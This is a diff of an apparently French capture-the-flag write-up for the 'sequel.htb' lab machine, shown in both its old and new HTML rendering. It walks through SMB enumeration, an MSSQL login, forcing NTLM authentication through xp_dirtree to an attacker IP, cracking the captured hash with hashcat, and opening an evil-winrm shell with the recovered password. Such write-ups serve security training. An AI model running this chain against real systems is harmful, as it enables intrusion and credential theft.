-Try &quot;help&quot; to get a list of possible commands.
-smb: \&gt; ls
-  .                                   D        0  Sat Nov 19 12:51:25 2022
-  ..                                  D        0  Sat Nov 19 12:51:25 2022
-  SQL Server Procedures.pdf           A    49551  Fri Nov 18 14:39:43 2022
-
-                5184255 blocks of size 4096. 1444011 blocks available
-smb: \&gt;
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>pak@kali:~$<span class="w"> </span>smbclient<span class="w"> </span>//sequel.htb/Public
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>Password<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="o">[</span>WORKGROUP<span class="se">\p</span>ak<span class="o">]</span>:
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>Try<span class="w"> </span><span class="s2">&quot;help&quot;</span><span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>a<span class="w"> </span>list<span class="w"> </span>of<span class="w"> </span>possible<span class="w"> </span>commands.
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>ls
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="w">  </span>.<span class="w">                                   </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Sat<span class="w"> </span>Nov<span class="w"> </span><span class="m">19</span><span class="w"> </span><span class="m">12</span>:51:25<span class="w"> </span><span class="m">2022</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="w">  </span>..<span class="w">                                  </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Sat<span class="w"> </span>Nov<span class="w"> </span><span class="m">19</span><span class="w"> </span><span class="m">12</span>:51:25<span class="w"> </span><span class="m">2022</span>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="w">  </span>SQL<span class="w"> </span>Server<span class="w"> </span>Procedures.pdf<span class="w">           </span>A<span class="w">    </span><span class="m">49551</span><span class="w">  </span>Fri<span class="w"> </span>Nov<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">14</span>:39:43<span class="w"> </span><span class="m">2022</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="w">                </span><span class="m">5184255</span><span class="w"> </span>blocks<span class="w"> </span>of<span class="w"> </span>size<span class="w"> </span><span class="m">4096</span>.<span class="w"> </span><span class="m">1444011</span><span class="w"> </span>blocks<span class="w"> </span>available
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>smb:<span class="w"> </span><span class="se">\&gt;</span>
+</span></code></pre></div>
 <p>On le récupère :</p>
-<pre><code class="language-bash">smb: \&gt; get &quot;SQL Server Procedures.pdf&quot;
-getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (254.7 KiloBytes/sec) (average 254.7 KiloBytes/sec)
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>get<span class="w"> </span><span class="s2">&quot;SQL Server Procedures.pdf&quot;</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>getting<span class="w"> </span>file<span class="w"> </span><span class="se">\S</span>QL<span class="w"> </span>Server<span class="w"> </span>Procedures.pdf<span class="w"> </span>of<span class="w"> </span>size<span class="w"> </span><span class="m">49551</span><span class="w"> </span>as<span class="w"> </span>SQL<span class="w"> </span>Server<span class="w"> </span>Procedures.pdf<span class="w"> </span><span class="o">(</span><span class="m">254</span>.7<span class="w"> </span>KiloBytes/sec<span class="o">)</span><span class="w"> </span><span class="o">(</span>average<span class="w"> </span><span class="m">254</span>.7<span class="w"> </span>KiloBytes/sec<span class="o">)</span>
+</span></code></pre></div>
 <p><img alt="Pasted image 20240222164716" src="../../../../Files/Pasted%20image%2020240222164716.png" /></p>
 <p>Ok ! Je me prépare une petite wordlist d'utilisateur avec les noms présents dans le document, ça peut servir. On voit aussi des creds pour l'accès au mssql, ils ne doivent pas avoir énormément de droits mais bon, on a quelque-chose :).</p>
 <h3 id="exploitation">Exploitation</h3>
 <p>On tente de se connecter à mssql:</p>
-<pre><code class="language-bash">pak@kali:~$ impacket-mssqlclient PublicUser@sequel.htb
-Impacket v0.11.0 - Copyright 2023 Fortra
-
-Password:
-[*] Encryption required, switching to TLS
-[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
-[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
-[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
-[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
-[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
-[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
-[!] Press help for extra shell commands
-SQL (PublicUser  guest@master)&gt;
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>pak@kali:~$<span class="w"> </span>impacket-mssqlclient<span class="w"> </span>PublicUser@sequel.htb
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>Impacket<span class="w"> </span>v0.11.0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span><span class="m">2023</span><span class="w"> </span>Fortra
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>Password:
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Encryption<span class="w"> </span>required,<span class="w"> </span>switching<span class="w"> </span>to<span class="w"> </span>TLS
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>:<span class="w"> </span>Old<span class="w"> </span>Value:<span class="w"> </span>master,<span class="w"> </span>New<span class="w"> </span>Value:<span class="w"> </span>master
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>:<span class="w"> </span>Old<span class="w"> </span>Value:<span class="w"> </span>,<span class="w"> </span>New<span class="w"> </span>Value:<span class="w"> </span>us_english
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>:<span class="w"> </span>Old<span class="w"> </span>Value:<span class="w"> </span><span class="m">4096</span>,<span class="w"> </span>New<span class="w"> </span>Value:<span class="w"> </span><span class="m">16192</span>
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>INFO<span class="o">(</span>DC<span class="se">\S</span>QLMOCK<span class="o">)</span>:<span class="w"> </span>Line<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>Changed<span class="w"> </span>database<span class="w"> </span>context<span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;master&#39;</span>.
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>INFO<span class="o">(</span>DC<span class="se">\S</span>QLMOCK<span class="o">)</span>:<span class="w"> </span>Line<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>Changed<span class="w"> </span>language<span class="w"> </span>setting<span class="w"> </span>to<span class="w"> </span>us_english.
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>ACK:<span class="w"> </span>Result:<span class="w"> </span><span class="m">1</span><span class="w"> </span>-<span class="w"> </span>Microsoft<span class="w"> </span>SQL<span class="w"> </span>Server<span class="w"> </span><span class="o">(</span><span class="m">150</span><span class="w"> </span><span class="m">7208</span><span class="o">)</span><span class="w"> </span>
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Press<span class="w"> </span><span class="nb">help</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>extra<span class="w"> </span>shell<span class="w"> </span>commands
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>SQL<span class="w"> </span><span class="o">(</span>PublicUser<span class="w">  </span>guest@master<span class="o">)</span>&gt;
+</span></code></pre></div>
 <p>On est connectés o/ !
 Mais on n'a accès à pas grand chose. Un MsSQL vide, rien que du très classique. </p>
-<pre><code class="language-bash">SQL (PublicUser  guest@master)&gt; enum_db
-name     is_trustworthy_on   
-------   -----------------   
-master                   0   
-
-tempdb                   0   
-
-model                    0   
-
-msdb                     1 
-
-
-
-SQL (PublicUser  guest@master)&gt; enum_users
-UserName             RoleName   LoginName   DefDBName   DefSchemaName       UserID     SID   
-------------------   --------   ---------   ---------   -------------   ----------   -----   
-dbo                  db_owner   sa          master      dbo             b'1         '   b'01'   
-
-guest                public     NULL        NULL        guest           b'2         '   b'00'   
-
-INFORMATION_SCHEMA   public     NULL        NULL        NULL            b'3         '    NULL   
-
-sys                  public     NULL        NULL        NULL            b'4         '    NULL 
-
-
-
-SQL (PublicUser  guest@master)&gt; enum_impersonate
-execute as   database   permission_name   state_desc   grantee   grantor   
-----------   --------   ---------------   ----------   -------   -------  
-
-
-SQL (PublicUser  guest@msdb)&gt; enable_xp_cmdshell
-[-] ERROR(DC\SQLMOCK): Line 105: User does not have permission to perform this action.
-[-] ERROR(DC\SQLMOCK): Line 1: You do not have permission to run the RECONFIGURE statement.
-[-] ERROR(DC\SQLMOCK): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
-[-] ERROR(DC\SQLMOCK): Line 1: You do not have permission to run the RECONFIGURE statement.
-
-
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>SQL<span class="w"> </span><span class="o">(</span>PublicUser<span class="w">  </span>guest@master<span class="o">)</span>&gt;<span class="w"> </span>enum_db
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>name<span class="w">     </span>is_trustworthy_on<span class="w">   </span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>------<span class="w">   </span>-----------------<span class="w">   </span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>master<span class="w">                   </span><span class="m">0</span><span class="w">   </span>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>tempdb<span class="w">                   </span><span class="m">0</span><span class="w">   </span>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>model<span class="w">                    </span><span class="m">0</span><span class="w">   </span>
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>
+</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>msdb<span class="w">                     </span><span class="m">1</span><span class="w"> </span>
+</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>
+</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>
+</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>
+</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>SQL<span class="w"> </span><span class="o">(</span>PublicUser<span class="w">  </span>guest@master<span class="o">)</span>&gt;<span class="w"> </span>enum_users
+</span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a>UserName<span class="w">             </span>RoleName<span class="w">   </span>LoginName<span class="w">   </span>DefDBName<span class="w">   </span>DefSchemaName<span class="w">       </span>UserID<span class="w">     </span>SID<span class="w">   </span>
+</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a>------------------<span class="w">   </span>--------<span class="w">   </span>---------<span class="w">   </span>---------<span class="w">   </span>-------------<span class="w">   </span>----------<span class="w">   </span>-----<span class="w">   </span>
+</span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a>dbo<span class="w">                  </span>db_owner<span class="w">   </span>sa<span class="w">          </span>master<span class="w">      </span>dbo<span class="w">             </span>b<span class="s1">&#39;1         &#39;</span><span class="w">   </span>b<span class="s1">&#39;01&#39;</span><span class="w">   </span>
+</span><span id="__span-5-18"><a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a>
+</span><span id="__span-5-19"><a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a>guest<span class="w">                </span>public<span class="w">     </span>NULL<span class="w">        </span>NULL<span class="w">        </span>guest<span class="w">           </span>b<span class="s1">&#39;2         &#39;</span><span class="w">   </span>b<span class="s1">&#39;00&#39;</span><span class="w">   </span>
+</span><span id="__span-5-20"><a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a>
+</span><span id="__span-5-21"><a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a>INFORMATION_SCHEMA<span class="w">   </span>public<span class="w">     </span>NULL<span class="w">        </span>NULL<span class="w">        </span>NULL<span class="w">            </span>b<span class="s1">&#39;3         &#39;</span><span class="w">    </span>NULL<span class="w">   </span>
+</span><span id="__span-5-22"><a id="__codelineno-5-22" name="__codelineno-5-22" href="#__codelineno-5-22"></a>
+</span><span id="__span-5-23"><a id="__codelineno-5-23" name="__codelineno-5-23" href="#__codelineno-5-23"></a>sys<span class="w">                  </span>public<span class="w">     </span>NULL<span class="w">        </span>NULL<span class="w">        </span>NULL<span class="w">            </span>b<span class="s1">&#39;4         &#39;</span><span class="w">    </span>NULL<span class="w"> </span>
+</span><span id="__span-5-24"><a id="__codelineno-5-24" name="__codelineno-5-24" href="#__codelineno-5-24"></a>
+</span><span id="__span-5-25"><a id="__codelineno-5-25" name="__codelineno-5-25" href="#__codelineno-5-25"></a>
+</span><span id="__span-5-26"><a id="__codelineno-5-26" name="__codelineno-5-26" href="#__codelineno-5-26"></a>
+</span><span id="__span-5-27"><a id="__codelineno-5-27" name="__codelineno-5-27" href="#__codelineno-5-27"></a>SQL<span class="w"> </span><span class="o">(</span>PublicUser<span class="w">  </span>guest@master<span class="o">)</span>&gt;<span class="w"> </span>enum_impersonate
+</span><span id="__span-5-28"><a id="__codelineno-5-28" name="__codelineno-5-28" href="#__codelineno-5-28"></a>execute<span class="w"> </span>as<span class="w">   </span>database<span class="w">   </span>permission_name<span class="w">   </span>state_desc<span class="w">   </span>grantee<span class="w">   </span>grantor<span class="w">   </span>
+</span><span id="__span-5-29"><a id="__codelineno-5-29" name="__codelineno-5-29" href="#__codelineno-5-29"></a>----------<span class="w">   </span>--------<span class="w">   </span>---------------<span class="w">   </span>----------<span class="w">   </span>-------<span class="w">   </span>-------<span class="w">  </span>
+</span><span id="__span-5-30"><a id="__codelineno-5-30" name="__codelineno-5-30" href="#__codelineno-5-30"></a>
+</span><span id="__span-5-31"><a id="__codelineno-5-31" name="__codelineno-5-31" href="#__codelineno-5-31"></a>
+</span><span id="__span-5-32"><a id="__codelineno-5-32" name="__codelineno-5-32" href="#__codelineno-5-32"></a>SQL<span class="w"> </span><span class="o">(</span>PublicUser<span class="w">  </span>guest@msdb<span class="o">)</span>&gt;<span class="w"> </span>enable_xp_cmdshell
+</span><span id="__span-5-33"><a id="__codelineno-5-33" name="__codelineno-5-33" href="#__codelineno-5-33"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>ERROR<span class="o">(</span>DC<span class="se">\S</span>QLMOCK<span class="o">)</span>:<span class="w"> </span>Line<span class="w"> </span><span class="m">105</span>:<span class="w"> </span>User<span class="w"> </span>does<span class="w"> </span>not<span class="w"> </span>have<span class="w"> </span>permission<span class="w"> </span>to<span class="w"> </span>perform<span class="w"> </span>this<span class="w"> </span>action.
+</span><span id="__span-5-34"><a id="__codelineno-5-34" name="__codelineno-5-34" href="#__codelineno-5-34"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>ERROR<span class="o">(</span>DC<span class="se">\S</span>QLMOCK<span class="o">)</span>:<span class="w"> </span>Line<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>You<span class="w"> </span><span class="k">do</span><span class="w"> </span>not<span class="w"> </span>have<span class="w"> </span>permission<span class="w"> </span>to<span class="w"> </span>run<span class="w"> </span>the<span class="w"> </span>RECONFIGURE<span class="w"> </span>statement.
+</span><span id="__span-5-35"><a id="__codelineno-5-35" name="__codelineno-5-35" href="#__codelineno-5-35"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>ERROR<span class="o">(</span>DC<span class="se">\S</span>QLMOCK<span class="o">)</span>:<span class="w"> </span>Line<span class="w"> </span><span class="m">62</span>:<span class="w"> </span>The<span class="w"> </span>configuration<span class="w"> </span>option<span class="w"> </span><span class="s1">&#39;xp_cmdshell&#39;</span><span class="w"> </span>does<span class="w"> </span>not<span class="w"> </span>exist,<span class="w"> </span>or<span class="w"> </span>it<span class="w"> </span>may<span class="w"> </span>be<span class="w"> </span>an<span class="w"> </span>advanced<span class="w"> </span>option.
+</span><span id="__span-5-36"><a id="__codelineno-5-36" name="__codelineno-5-36" href="#__codelineno-5-36"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>ERROR<span class="o">(</span>DC<span class="se">\S</span>QLMOCK<span class="o">)</span>:<span class="w"> </span>Line<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>You<span class="w"> </span><span class="k">do</span><span class="w"> </span>not<span class="w"> </span>have<span class="w"> </span>permission<span class="w"> </span>to<span class="w"> </span>run<span class="w"> </span>the<span class="w"> </span>RECONFIGURE<span class="w"> </span>statement.
+</span></code></pre></div>
 <p>Par contre, xp_dirtree donctionne, on va donc lancer l'ami responder :).</p>
-<pre><code class="language-bash">SQL (PublicUser  guest@msdb)&gt; xp_dirtree \\10.10.16.35\truc
-subdirectory   depth   file   
-------------   -----   ----   
-
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>SQL<span class="w"> </span><span class="o">(</span>PublicUser<span class="w">  </span>guest@msdb<span class="o">)</span>&gt;<span class="w"> </span>xp_dirtree<span class="w"> </span><span class="se">\\</span><span class="m">10</span>.10.16.35<span class="se">\t</span>ruc
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>subdirectory<span class="w">   </span>depth<span class="w">   </span>file<span class="w">   </span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>------------<span class="w">   </span>-----<span class="w">   </span>----<span class="w">   </span>
+</span></code></pre></div>
 <p>La réponse ne se fait pas attendre :</p>
-<pre><code class="language-bash">SMB] NTLMv2-SSP Client   : 10.129.81.126
-[SMB] NTLMv2-SSP Username : sequel\sql_svc
-[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:a6a02dbbac9d28d3:ECBB0B14CAA499F1C21BE0F8105B7C71:010100000000000080EC7F76AEFED9011938B2AEE6D4806800000000020008003500510052004A0001001E00570049004E002D004200580055004C00330034004400470036005A00330004003400570049004E002D004200580055004C00330034004400470036005A0033002E003500510052004A002E004C004F00430041004C00030014003500510052004A002E004C004F00430041004C00050014003500510052004A002E004C004F00430041004C000700080080EC7F76AEFED90106000400020000000800300030000000000000000000000000300000A401AD8EFEE268390CFF1D1727512D9D2310CAB5E65EEEDB97C2684ACBF859020A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330035000000000000000000
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>SMB<span class="o">]</span><span class="w"> </span>NTLMv2-SSP<span class="w"> </span>Client<span class="w">   </span>:<span class="w"> </span><span class="m">10</span>.129.81.126
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="o">[</span>SMB<span class="o">]</span><span class="w"> </span>NTLMv2-SSP<span class="w"> </span>Username<span class="w"> </span>:<span class="w"> </span>sequel<span class="se">\s</span>ql_svc
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="o">[</span>SMB<span class="o">]</span><span class="w"> </span>NTLMv2-SSP<span class="w"> </span>Hash<span class="w">     </span>:<span class="w"> </span>sql_svc::sequel:a6a02dbbac9d28d3:ECBB0B14CAA499F1C21BE0F8105B7C71:010100000000000080EC7F76AEFED9011938B2AEE6D4806800000000020008003500510052004A0001001E00570049004E002D004200580055004C00330034004400470036005A00330004003400570049004E002D004200580055004C00330034004400470036005A0033002E003500510052004A002E004C004F00430041004C00030014003500510052004A002E004C004F00430041004C00050014003500510052004A002E004C004F00430041004C000700080080EC7F76AEFED90106000400020000000800300030000000000000000000000000300000A401AD8EFEE268390CFF1D1727512D9D2310CAB5E65EEEDB97C2684ACBF859020A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330035000000000000000000
+</span></code></pre></div>
 <p>Okay, on a maintenant un user sql_svc et son hash ! Ne reste plus qu'à prier pour qu'on puisse le cracker sans trop de problème :).</p>
-<pre><code class="language-bash">pak@kali:~$ hashcat 'sql_svc::sequel:a6a02dbbac9d28d3:ECBB0B14CAA499F1C21BE0F8105B7C71:010100000000000080EC7F76AEFED9011938B2AEE6D4806800000000020008003500510052004A0001001E00570049004E002D004200580055004C00330034004400470036005A00330004003400570049004E002D004200580055004C00330034004400470036005A0033002E003500510052004A002E004C004F00430041004C00030014003500510052004A002E004C004F00430041004C00050014003500510052004A002E004C004F00430041004C000700080080EC7F76AEFED90106000400020000000800300030000000000000000000000000300000A401AD8EFEE268390CFF1D1727512D9D2310CAB5E65EEEDB97C2684ACBF859020A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330035000000000000000000' /usr/share/wordlists/rockyou.txt.gz
-</code></pre>
-<pre><code class="language-bash">SQL_SVC::sequel:a6a02dbbac9d28d3:ecbb0b14caa499f1c21be0f8105b7c71:010100000000000080ec7f76aefed9011938b2aee6d4806800000000020008003500510052004a0001001e00570049004e002d004200580055004c00330034004400470036005a00330004003400570049004e002d004200580055004c00330034004400470036005a0033002e003500510052004a002e004c004f00430041004c00030014003500510052004a002e004c004f00430041004c00050014003500510052004a002e004c004f00430041004c000700080080ec7f76aefed90106000400020000000800300030000000000000000000000000300000a401ad8efee268390cff1d1727512d9d2310cab5e65eeedb97c2684acbf859020a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00330035000000000000000000:REGGIE1234ronnie
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>pak@kali:~$<span class="w"> </span>hashcat<span class="w"> </span><span class="s1">&#39;sql_svc::sequel:a6a02dbbac9d28d3:ECBB0B14CAA499F1C21BE0F8105B7C71:010100000000000080EC7F76AEFED9011938B2AEE6D4806800000000020008003500510052004A0001001E00570049004E002D004200580055004C00330034004400470036005A00330004003400570049004E002D004200580055004C00330034004400470036005A0033002E003500510052004A002E004C004F00430041004C00030014003500510052004A002E004C004F00430041004C00050014003500510052004A002E004C004F00430041004C000700080080EC7F76AEFED90106000400020000000800300030000000000000000000000000300000A401AD8EFEE268390CFF1D1727512D9D2310CAB5E65EEEDB97C2684ACBF859020A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330035000000000000000000&#39;</span><span class="w"> </span>/usr/share/wordlists/rockyou.txt.gz
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>SQL_SVC::sequel:a6a02dbbac9d28d3:ecbb0b14caa499f1c21be0f8105b7c71:010100000000000080ec7f76aefed9011938b2aee6d4806800000000020008003500510052004a0001001e00570049004e002d004200580055004c00330034004400470036005a00330004003400570049004e002d004200580055004c00330034004400470036005a0033002e003500510052004a002e004c004f00430041004c00030014003500510052004a002e004c004f00430041004c00050014003500510052004a002e004c004f00430041004c000700080080ec7f76aefed90106000400020000000800300030000000000000000000000000300000a401ad8efee268390cff1d1727512d9d2310cab5e65eeedb97c2684acbf859020a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00330035000000000000000000:REGGIE1234ronnie
+</span></code></pre></div>
 <p>Et voilà de nouveaux creds ! <strong>sql_svc:REGGIE1234ronnie</strong>, impeccable. On a vu pendant le nmap qu'il était possible de se connecter via winrm. Aller, ça se tente.</p>
-<pre><code class="language-bash">pak@kali:~$ evil-winrm -i sequel.htb -u &quot;sql_svc&quot; -p &quot;REGGIE1234ronnie&quot;
-
-Evil-WinRM shell v3.5
-
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                       
-
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                         
-
-Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\sql_svc\Documents&gt; whoami /all
-
-USER INFORMATION                                                                                                                           
-----------------                                                                                                                            
-User Name      SID                                                                                                                        
-============== ==============================================                                                                              
-sequel\sql_svc S-1-5-21-4078382237-1492182817-2568127209-1106                           
-
-GROUP INFORMATION                                                            
------------------                                                                       
-Group Name                                  Type             SID          Attributes                                                       
-=========================================== ================ ============ ==================================================               
-Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group               
-BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group               
-BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
-BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
-BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
-Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
-
-
-PRIVILEGES INFORMATION
-----------------------
-
-Privilege Name                Description                    State
-============================= ============================== =======
-SeMachineAccountPrivilege     Add workstations to domain     Enabled
-SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
-SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
-
-
-USER CLAIMS INFORMATION
------------------------
-
-User claims unknown.
-
-Kerberos support for Dynamic Access Control on this device has been disabled.
-
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>pak@kali:~$<span class="w"> </span>evil-winrm<span class="w"> </span>-i<span class="w"> </span>sequel.htb<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;sql_svc&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;REGGIE1234ronnie&quot;</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>Evil-WinRM<span class="w"> </span>shell<span class="w"> </span>v3.5
